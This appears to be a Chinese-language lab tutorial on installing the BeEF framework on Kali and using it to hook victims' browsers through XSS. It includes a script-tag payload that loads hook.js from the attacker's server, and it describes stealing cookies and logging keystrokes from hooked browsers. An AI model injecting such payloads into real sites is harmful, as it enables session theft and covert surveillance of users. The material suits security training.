# beef-xss安装

对于新的kali 2020版的kali系统，使用 apt install beef-xss即可安装。

打开终端，输入如下命令：

```bash
apt-get update  //取更新的软件包的索引源，作用是同步源的软件包 的索引系信息，从而进行软件更新，若不执行可能安装失败

apt-get install beef-xss
```

则beef就会被安装到`/usr/share/beef-xss`目录之下

# beef-xss使用

kali可能通过直接执行命令的方式启动或关闭beef服务器，也可以通过服务的方式进行管理，在初次使用时建议使用命令方式启动，以便观察它的启动过程。

```bash
beef-xss# 命令方式启动
beef-xss-stop           # 命令方式关闭 
systemctl start beef-xss.service    #开启
beefsystemctl stop beef-xss.service     #关闭
beefsystemctl restart beef-xss.service  #重启beef
```

### beef启动

直接在终端输入`beef-xss`启动，beef的默认用户名和密码为beef和beef，首次启动强制修改默认密码，自行填写(笔者设置的是root)，按提示输入修改的密码即可，稍等一下，beef服务器则启动成功

![](https://img.yatjay.top/md/202203251558279.png)

### beef的图形化管理后台

使用浏览器打开`http://127.0.0.1:3000/ui/panel`它的管理界面，输入默认的账号beef和您修改的密码，即可进入它的管理系统。启动后在浏览器图形界面使用上述设置的用户名`beef` 密码`root`登录

![](https://img.yatjay.top/md/202203251558415.png)

也可以在外网通过公网IP访问beef的图形化面板，比如在本地物理机上尝试访问

`192.168.137.132:3000/ui/panel`

![](https://img.yatjay.top/md/202203251558961.png)



输入用户名密码也可成功登陆管理界面

![](https://img.yatjay.top/md/202203251558340.png)



### 构造payload

参考终端中给出的示例构造payload

参考示例

```js
<script src="http://IP:3000/hook.js"></script>
```

查看Kali的IP地址192.168.137.132后构造payload

```js
<script src="http://192.168.137.132:3000/hook.js"></script>
```

### 注入payload

将构造好的payload插入XSS注入点并提交

![](https://img.yatjay.top/md/202203251558557.png)

### 触发XSS

后台用户触发XSS脚本

![](https://img.yatjay.top/md/202203251558049.png)

当受害者打开浏览器客户端时，我们在beEf的管理后台就可以看到IP为`192.168.137.1`的主机上线

![](https://img.yatjay.top/md/202203251559061.png)

### BeEF管理界面操作

Detailes模块是浏览器、插件版本信息，操作系统信息：

![](https://img.yatjay.top/md/202203251559126.png)

Logs模块可以查看鼠标点击，键盘输入的一些操作：

![](https://img.yatjay.top/md/202203251559127.png)

commands模块可以对目标系统进行入侵：

![](https://img.yatjay.top/md/202203251559117.png)

比如Get Cookie可以获取Cookie值

![](https://img.yatjay.top/md/202203251559060.png)

比如create Alert Dialog可以在目标系统上弹窗：

beef设置弹窗内容

![](https://img.yatjay.top/md/202203251559893.png)

执行后目标系统就能看到弹窗了

![](https://img.yatjay.top/md/202203251559682.png)
